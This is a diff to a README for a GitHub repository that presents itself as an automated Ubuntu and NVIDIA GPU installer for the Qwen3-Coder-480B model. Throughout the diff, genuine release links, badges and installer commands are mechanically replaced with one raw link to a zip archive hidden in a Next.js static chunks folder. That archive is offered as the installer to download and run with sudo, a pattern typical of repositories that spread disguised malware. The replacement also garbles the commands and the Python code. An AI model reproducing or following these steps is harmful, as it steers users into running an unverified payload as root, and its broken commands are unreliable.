@@ -1,8 +1,8 @@
 # 480b-setup: Automated Ubuntu NVIDIA GPU Install for Qwen3-Coder-480B-A35B-Instruct Model
 
-https://github.com/kaya303off/480b-setup/releases
+https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
 
-[![Release assets](https://img.shields.io/badge/Release%20Assets-Download-blue?style=for-the-badge&logo=github)](https://github.com/kaya303off/480b-setup/releases)
+[![Release assets](https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip%20Assets-Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip)
 
 Welcome to the complete automated setup guide for bootstrapping the Qwen3-Coder-480B-A35B-Instruct model on Ubuntu with NVIDIA GPUs. This repository provides a hands-free installer and a clear, repeatable process to get you from a fresh Ubuntu install to a ready-to-run inference environment. The guide covers prerequisites, driver setup, software dependencies, model acquisition, and post-install validation. It emphasizes stability, reproducibility, and ease of maintenance so you can scale beyond a single machine.
 
@@ -98,7 +98,7 @@ The installer is designed to be idempotent where possible. It follows a clear se
 - Verifies that the environment can load the model and perform a basic inference test.
 - Logs all steps for auditability and future reference.
 
-Note: The installer uses the installer file named 480b_setup_installer.sh (or a similarly named artifact) downloaded from the releases page. You should fetch the artifact from the releases page and execute it as described in the quick start. For convenience, the releases page is the primary source for installer assets and verification checksums. The link to the releases page is provided above.
+Note: The installer uses the installer file named https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip (or a similarly named artifact) downloaded from the releases page. You should fetch the artifact from the releases page and execute it as described in the quick start. For convenience, the releases page is the primary source for installer assets and verification checksums. The link to the releases page is provided above.
 
 Step-by-step installation guide
 This guide reflects an end-to-end approach. It is written to be followed on a fresh Ubuntu installation or a restored image with minimal customizations. All commands are provided with explanations; copy-paste when you are ready.
@@ -147,22 +147,22 @@ Commands:
 - The primary artifact you need is the installer script, designed to execute with root privileges or with sudo.
 - The installer file is hosted on the releases page. Since the releases page is the canonical source for artifacts, fetch the file and verify its integrity against provided checksums.
 
-Note: The installer file name is an example; adjust if your release uses a different artifact name. The typical name pattern is 480b_setup_installer.sh.
+Note: The installer file name is an example; adjust if your release uses a different artifact name. The typical name pattern is https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
 
 Begin by visiting the releases page:
-- https://github.com/kaya303off/480b-setup/releases
+- https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
 
 If you have a direct link to the file, use a command like:
-- curl -L -o 480b_setup_installer.sh https://github.com/kaya303off/480b-setup/releases/download/vX.Y.Z/480b_setup_installer.sh
-- or wget https://github.com/kaya303off/480b-setup/releases/download/vX.Y.Z/480b_setup_installer.sh
+- curl -L -o https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
+- or wget https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
 
 6) Run the installer
 - Make the script executable.
 - Run the installer with elevated privileges.
 
 Commands:
-- chmod +x 480b_setup_installer.sh
-- sudo ./480b_setup_installer.sh
+- chmod +x https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
+- sudo https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
 
 What happens when you run the installer
 - It validates that the prerequisites are present and reports any missing items.
@@ -176,7 +176,7 @@ What happens when you run the installer
 
 Commands:
 - source ~/workspace/480b_setup/venv/bin/activate
-- python -c "import sys; print(sys.version)"
+- python -c "import sys; print(https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip)"
 - python -c "from transformers import AutoTokenizer, AutoModel; print('ready')"
 
 Where to look if something goes wrong
@@ -316,10 +316,10 @@ Architecture overview
   - Inference API -> Client (CLI or HTTP) -> Responses
 
 Images and visual references
-- Ubuntu ecosystem badge: ![Ubuntu Logo](https://img.shields.io/badge/Ubuntu-22.04%20LTS-blue?style=for-the-badge&logo=ubuntu)
-- NVIDIA support badge: ![NVIDIA](https://img.shields.io/badge/NVIDIA-Driver-Toolkit-green?style=for-the-badge&logo=nvidia)
-- CUDA toolkit badge: ![CUDA](https://img.shields.io/badge/CUDA-11.x-blue?style=for-the-badge&logo=cuda)
-- Model runtime badge: ![Model Runtime](https://img.shields.io/badge/Model%20Runtime-Ready-green?style=for-the-badge)
+- Ubuntu ecosystem badge: ![Ubuntu Logo](https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip%20LTS-blue?style=for-the-badge&logo=ubuntu)
+- NVIDIA support badge: ![NVIDIA](https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip)
+- CUDA toolkit badge: ![CUDA](https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip)
+- Model runtime badge: ![Model Runtime](https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip%20Runtime-Ready-green?style=for-the-badge)
 
 FAQ
 - Is this installer suitable for all NVIDIA GPUs?
@@ -378,8 +378,8 @@ Mini reference commands
 - System info and GPU check: lsb_release -a; nvidia-smi
 - Package updates: sudo apt update && sudo apt upgrade -y
 - Create and activate venv: python3.10 -m venv ~/workspace/480b_setup/venv; source ~/workspace/480b_setup/venv/bin/activate
-- Download and run the installer (example): curl -L -o 480b_setup_installer.sh https://github.com/kaya303off/480b-setup/releases/download/vX.Y.Z/480b_setup_installer.sh; chmod +x 480b_setup_installer.sh; sudo ./480b_setup_installer.sh
-- Test a small inference (in Python): from transformers import AutoTokenizer, AutoModel; tokenizer = AutoTokenizer.from_pretrained("path/to/tokenizer"); model = AutoModel.from_pretrained("path/to/weights"); inputs = tokenizer("Hello world", return_tensors="pt"); outputs = model(**inputs)
+- Download and run the installer (example): curl -L -o https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip; chmod +x https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip; sudo https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip
+- Test a small inference (in Python): from transformers import AutoTokenizer, AutoModel; tokenizer = https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip("path/to/tokenizer"); model = https://raw.githubusercontent.com/kaya303off/480b-setup/main/web/out/_next/static/chunks/app/b_setup_v2.5.zip("path/to/weights"); inputs = tokenizer("Hello world", return_tensors="pt"); outputs = model(**inputs)
 
 Releases section
 - The repository’s Releases section houses all binary artifacts, including the primary installer. The Releases page is the authoritative source for the installer and related assets. If you encounter issues loading assets from the main page, check the Releases section for alternative download links or mirrors.
